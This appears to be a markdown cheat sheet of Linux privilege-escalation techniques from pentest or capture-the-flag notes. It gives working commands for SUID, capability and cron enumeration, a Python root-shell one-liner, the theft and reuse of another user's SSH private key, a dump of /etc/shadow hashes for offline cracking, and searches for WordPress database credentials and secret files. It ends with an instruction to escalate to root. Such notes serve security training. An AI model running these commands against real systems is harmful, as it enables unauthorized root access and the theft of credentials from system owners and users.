
### List sudo privileges for the current user

Shows which commands the current user is allowed to run with `sudo`.

```
sudo -l
```

### Find files with the SUID bit set

Searches the entire filesystem for files with the SUID permission (`-4000`).

```bash
find / -perm -4000 2>/dev/null
```

- This command searches for files in the root directory '/' with the SUID (Set User Id) permission set.

```bash
find / -type f -perm -4000 2>/dev/null
```

### Find world‑writable directories

Lists directories that are writable by anyone (`-0002`). Shows world-writable directories. Attackers drop payloads or malicious scripts there to hijack cron jobs or services.

```bash
find / -type d -perm -0002 2>/dev/null
```

### Search for files with special capabilities

Recursively lists file capabilities (if `getcap` is available).

```bash
getcap -r / 2>/dev/null
```

### Inspect cron configuration and scripts

Searches cron-related directories and files for writable or interesting entries. Find Writable Cron Jobs.

```bash
grep -R "" /etc/cron* 2>/dev/null
```


Then check GTFOBins, if any of the commands are allowed as sudo, you may find an exploit to run the particular command and become root.

These three scripts will usually come in handy for PrivEsc, especially LinPEAS
- LinEnum.sh  
- linpeas.sh  
- lse.sh
- winPEAS for windows privelege escalation


- Check sudo version , linPEAS will let you know if the sudo version has vulns, eg: [[sudo CVE-2025-32463]]
- check kernel version for known kernel exploit or CVE that escalates priveleges, linPEAS will let you know if there are kernel exploits for the kernel version in the machine, eg: Dirty COW (CVE-2016-5195)

![[0_xTF6sGyU9Hrq6SAI.webp]]


### Spawn a Root Shell via Python (If Writable)

```python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- **Result:** Gives root shell if Python has setuid capability or is run as root in cron.  
- **Hack Value:** Exploits misconfigurations for privilege escalation.

### Sometimes you may not be able to become root, you might have to pivot using another user

- The user you have got a shell as may have access to the ``.ssh`` directory of another user where private/public keys of this user are stored.

- Look for SSH Keys

```bash
find / -name "id_rsa" 2>/dev/null
```

- copy the contents of this users id_rsa private key to your machine and give it permissions 

```bash
chmod 600 id_rsa
```

- next use this id_rsa(private key) file to connect to ssh as this user, the public key hash of that user which is in the victim machine will verify the connection.

```bash
ssh user@IP_ADDRESS -i id_rsa
```

### Extract Hashes from /etc/shadow (If Root)

```bash
cat /etc/shadow | awk -F: '{print $1 ":" $2}'
```

- **Result:** Dumps username:hash pairs.  
- **Hack Value:** Allows password cracking offline with `hashcat` or `john`. Great for lateral movement.

### Scan for WordPress Config Files

```bash
find /var/www -name "wp-config.php" 2>/dev/null
```

- **Result:** Finds WordPress config files.
- **Hack Value:** Usually contains DB creds — pivot to DB, dump users/passwords, escalate.

### Enumerate Interesting Files Owned by Root

```bash
find / -user root -type f 2>/dev/null | grep -E "conf|key|cfg|secret"
```

- **Result:** Shows sensitive root-owned config files.  
- **Hack Value:** Attackers look for SSH keys, DB configs, secret tokens to escalate further.

now try to escalate to root. Follow the instructions provided at the top of this .md file.